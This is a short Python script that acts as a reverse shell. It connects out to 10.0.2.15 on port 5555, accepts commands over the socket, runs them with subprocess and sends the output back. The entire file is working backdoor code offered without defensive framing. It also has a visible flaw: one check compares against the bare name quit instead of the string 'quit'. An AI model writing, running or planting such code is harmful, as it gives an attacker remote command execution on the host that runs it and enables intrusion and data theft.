import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 5555))

cmd = ""
while cmd != 'quit':
	s.send("Enter a command (type quit to exit): ".encode('utf-8'))
	cmd = s.recv(1024).decode("utf-8")
	cmd = cmd.strip()
	cmdList = cmd.split(' ')
	if cmd != quit:
		if len(cmdList) > 1:
			xyz = subprocess.check_output([cmdList[0], cmdList[1]])
		else:
			xyz = subprocess.check_output([cmdList[0]])
			
		s.send(xyz)

s.close()
